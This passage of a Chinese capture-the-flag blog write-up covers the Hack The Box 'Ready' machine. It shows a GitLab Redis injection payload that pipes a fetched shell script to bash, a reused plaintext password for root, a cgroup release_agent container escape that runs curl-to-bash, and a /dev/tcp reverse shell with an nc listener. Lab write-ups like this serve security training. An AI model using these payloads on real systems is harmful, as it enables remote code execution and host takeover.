12<br>drwxr-xr-x 2 root root 4096 Apr  5  2022 .<br>drwxr-xr-x 1 root root 4096 Apr  5  2022 ..<br>-r-xr-x--x 2 git  git    33 Jan 16 01:51 user.txt<br>git@gitlab:~/gitlab-rails/working$ <span class="hljs-built_in">cat</span> /home/dude/user.txt<br><span class="hljs-built_in">cat</span> /home/dude/user.txt<br>9db1020b9d3cc27229c646622b524844<br>git@gitlab:~/gitlab-rails/working$ <br></code></pre></td></tr></table></figure>
+
+<p>12、这里其实反过来推这个exp为啥没执行成功，原来是估计程序里不知道直接nc 形式的反弹，下面修改了获取反弹shell的命令，最后成功获取到shell。</p>
+<p><img src="http://sh1yan.top/photo/Ready-htb-writeup/5.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">form = <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;\nmulti</span><br><span class="hljs-string">    sadd resque:gitlab:queues system_hook_push</span><br><span class="hljs-string">    lpush resque:gitlab:queue:system_hook_push &quot;</span>&#123;\\&quot;class\\&quot;:\\&quot;GitlabShellWorker\\&quot;,\\&quot;args\\&quot;:[\\&quot;class_eval\\&quot;,\\&quot;open(\\<span class="hljs-string">&#x27;|&quot;&quot;&quot; + f&#x27;</span>curl http://&#123;local_ip&#125;:&#123;local_port&#125;/shell.sh | bash<span class="hljs-string">&#x27; + &quot;&quot;&quot; \\&#x27;</span>).<span class="hljs-built_in">read</span>\\&quot;],\\&quot;retry\\&quot;:3,\\&quot;queue\\&quot;:\\&quot;system_hook_push\\&quot;,\\&quot;jid\\&quot;:\\&quot;ad52abc5641173e217eb2e52\\&quot;,\\&quot;created_at\\&quot;:1608799993.1234567,\\&quot;enqueued_at\\&quot;:1608799993.1234567&#125;<span class="hljs-string">&quot;</span><br><span class="hljs-string">    exec</span><br><span class="hljs-string">    exec</span><br><span class="hljs-string">    exec\n&quot;</span><span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Ready-htb-writeup/4.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="0x02-系统权限获取"><a href="#0x02-系统权限获取" class="headerlink" title="0x02 系统权限获取"></a>0x02 系统权限获取</h4><p>13、gitlab-secrets.json有与 GitLab 相关的密钥和东西，但对我来说没有任何用处。docker-compose.yml很有趣，以后会有用。gitlab.rb是一个配置文件，其中绝大多数行以注释#. 我将用来grep删除这些行，然后选择非空白行。只有一个：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">git@gitlab:~/gitlab-rails/working$ <span class="hljs-built_in">ls</span> -la                                                <br><span class="hljs-built_in">ls</span> -la                                                                                   <br>total 8                                                                                  <br>drwx------ 2 git root 4096 Apr  5  2022 .                                                <br>drwxr-xr-x 9 git root 4096 Jan 16 01:51 ..                                               <br>git@gitlab:~/gitlab-rails/working$ ipconfig<br>ipconfig<br>bash: ipconfig: <span class="hljs-built_in">command</span> not found<br>git@gitlab:~/gitlab-rails/working$ <span class="hljs-built_in">cd</span> /opt<br><span class="hljs-built_in">cd</span> /opt<br>git@gitlab:/opt$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 24<br>drwxr-xr-x 1 root root 4096 Apr  5  2022 .<br>drwxr-xr-x 1 root root 4096 Apr  5  2022 ..<br>drwxr-xr-x 2 root root 4096 Apr  5  2022 backup<br>drwxr-xr-x 1 root root 4096 Apr  5  2022 gitlab<br>git@gitlab:/opt$ <span class="hljs-built_in">cd</span> backup<br><span class="hljs-built_in">cd</span> backup<br>git@gitlab:/opt/backup$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 112<br>drwxr-xr-x 2 root root  4096 Apr  5  2022 .<br>drwxr-xr-x 1 root root  4096 Apr  5  2022 ..<br>-rw-r--r-- 1 root root   904 Apr  5  2022 docker-compose.yml<br>-rw-r--r-- 1 root root 15150 Apr  5  2022 gitlab-secrets.json<br>-rw-r--r-- 1 root root 81492 Apr  5  2022 gitlab.rb<br>git@gitlab:/opt/backup$ <span class="hljs-built_in">cat</span> gitlab.rb | grep -v <span class="hljs-string">&quot;^#&quot;</span> | grep .<br><span class="hljs-built_in">cat</span> gitlab.rb | grep -v <span class="hljs-string">&quot;^#&quot;</span> | grep .<br><br>gitlab_rails[<span class="hljs-string">&#x27;smtp_password&#x27;</span>] = <span class="hljs-string">&quot;wW59U!ZKMbG9+*#h&quot;</span><br><br>git@gitlab:/opt/backup$ <br></code></pre></td></tr></table></figure>
+
+<p>14、到这里就获取到了容器里的密码了，切换下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">git@gitlab:/opt/backup$ su -  <br>su -<br>Password: wW59U!ZKMbG9+*<span class="hljs-comment">#h</span><br><br>root@gitlab:~<span class="hljs-comment"># </span><br><br>root@gitlab:~<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>
+
+<p>15、接下来的操作，就触及知识盲区了，主要参考了下面的文章</p>
+<p><code>https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">d=`<span class="hljs-built_in">dirname</span> $(<span class="hljs-built_in">ls</span> -x /s*/fs/c*/*/r* |<span class="hljs-built_in">head</span> -n1)`<br><span class="hljs-built_in">mkdir</span> -p <span class="hljs-variable">$d</span>/w;<span class="hljs-built_in">echo</span> 1 &gt;<span class="hljs-variable">$d</span>/w/notify_on_release<br>t=`sed -n <span class="hljs-string">&#x27;s/.*\perdir=\([^,]*\).*/\1/p&#x27;</span> /etc/mtab`<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$t</span>/c &gt;<span class="hljs-variable">$d</span>/release_agent;<span class="hljs-built_in">printf</span> <span class="hljs-string">&#x27;#!/bin/sh\ncurl 10.10.14.8/poc.sh | bash&#x27;</span> &gt;/c;<br><span class="hljs-built_in">chmod</span> +x /c;sh -c <span class="hljs-string">&quot;echo 0 &gt;<span class="hljs-variable">$d</span>/w/cgroup.procs&quot;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>16、远程利用下，来读取下最终的flag信息吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ <span class="hljs-built_in">cat</span> poc.sh  <br><span class="hljs-comment">#!/bin/bash</span><br><br>bash &gt;&amp; /dev/tcp/10.10.14.8/10086 0&gt;&amp;1<br><br>root@gitlab:~<span class="hljs-comment"># d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`</span><br>d=`<span class="hljs-built_in">dirname</span> $(<span class="hljs-built_in">ls</span> -x /s*/fs/c*/*/r* |<span class="hljs-built_in">head</span> -n1)`<br>root@gitlab:~<span class="hljs-comment"># mkdir -p $d/w;echo 1 &gt;$d/w/notify_on_release</span><br><span class="hljs-built_in">mkdir</span> -p <span class="hljs-variable">$d</span>/w;<span class="hljs-built_in">echo</span> 1 &gt;<span class="hljs-variable">$d</span>/w/notify_on_release<br>root@gitlab:~<span class="hljs-comment"># t=`sed -n &#x27;s/.*\perdir=\([^,]*\).*/\1/p&#x27; /etc/mtab`</span><br>t=`sed -n <span class="hljs-string">&#x27;s/.*\perdir=\([^,]*\).*/\1/p&#x27;</span> /etc/mtab`<br>root@gitlab:~<span class="hljs-comment"># echo $t/c &gt;$d/release_agent;printf &#x27;#!/bin/sh\ncurl 10.10.14.8/poc.sh | bash&#x27; &gt;/c;</span><br>&lt;d/release_agent;<span class="hljs-built_in">printf</span> <span class="hljs-string">&#x27;#!/bin/sh\ncurl 10.10.14.8/poc.sh | bash&#x27;</span> &gt;/c;      <br>root@gitlab:~<span class="hljs-comment"># chmod +x /c;sh -c &quot;echo 0 &gt;$d/w/cgroup.procs&quot;;</span><br><span class="hljs-built_in">chmod</span> +x /c;sh -c <span class="hljs-string">&quot;echo 0 &gt;<span class="hljs-variable">$d</span>/w/cgroup.procs&quot;</span>;<br>root@gitlab:~<span class="hljs-comment"># id</span><br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br>root@gitlab:~<span class="hljs-comment"># </span><br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ nc -lvnp 10086<br>listening on [any] 10086 ...<br>connect to [10.10.14.8] from (UNKNOWN) [10.10.10.220] 54088<br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br><span class="hljs-built_in">pwd</span><br>/<br><span class="hljs-built_in">cd</span> /root/<br><span class="hljs-built_in">ls</span> -la<br>total 68<br>drwx------ 10 root root 4096 Jan 16 01:51 .<br>drwxr-xr-x 20 root root 4096 Apr  5  2022 ..<br>lrwxrwxrwx  1 root root    9 Jul 11  2020 .bash_history -&gt; /dev/null<br>-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc<br>drwx------  2 root root 4096 Apr  5  2022 .cache<br>drwx------  3 root root 4096 Apr  5  2022 .config<br>-rw-r--r--  1 root root   44 Jul  8  2020 .gitconfig<br>-rw-------  1 root root   32 Apr  5  2022 .lesshst<br>drwxr-xr-x  3 root root 4096 Apr  5  2022 .<span class="hljs-built_in">local</span><br>lrwxrwxrwx  1 root root    9 Dec  7  2020 .mysql_history -&gt; /dev/null<br>-rw-r--r--  1 root root  161 Dec  5  2019 .profile<br>-rw-r--r--  1 root root   75 Jul 12  2020 .selected_editor<br>drwx------  2 root root 4096 Apr  5  2022 .ssh<br>drwxr-xr-x  2 root root 4096 Apr  5  2022 .vim<br>-rw-rw-rw-  1 root root 1432 Apr  5  2022 .viminfo<br>drwxr-xr-x  3 root root 4096 Apr  5  2022 docker-gitlab<br>drwxr-xr-x 10 root root 4096 Apr  5  2022 ready-channel<br>-r--------  1 root root   33 Jan 16 01:51 root.txt<br>drwxr-xr-x  3 root root 4096 Apr  5  2022 snap<br><span class="hljs-built_in">cat</span> root.txt<br>b1bc77140df76ab7840a4e68b25a0edd<br></code></pre></td></tr></table></figure>
+
+<p>17、涉及到容器的技能，还是有些难啊 &#x3D; &#x3D;！</p>
+<h4 id="0x03-通关凭证展示"><a href="#0x03-通关凭证展示" class="headerlink" title="0x03 通关凭证展示"></a>0x03 通关凭证展示</h4><p><code>https://www.hackthebox.com/achievement/machine/1705469/304</code></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%89%93%E9%9D%B6%E8%AE%B0/" class="category-chain-item">打靶记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/shooting-range/" class="print-no-link">#shooting-range</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Ready-htb-writeup</div>
+      <div>https://sh1yan.top/2024/01/14/Ready-htb-writeup/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>shiyan</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年1月14日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/01/15/Ophiuchi-htb-writeup/" title="Ophiuchi-htb-writeup">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Ophiuchi-htb-writeup</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/01/13/Time-htb-writeup/" title="Time-htb-writeup">
+                        <span class="hidden-mobile">Time-htb-writeup</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
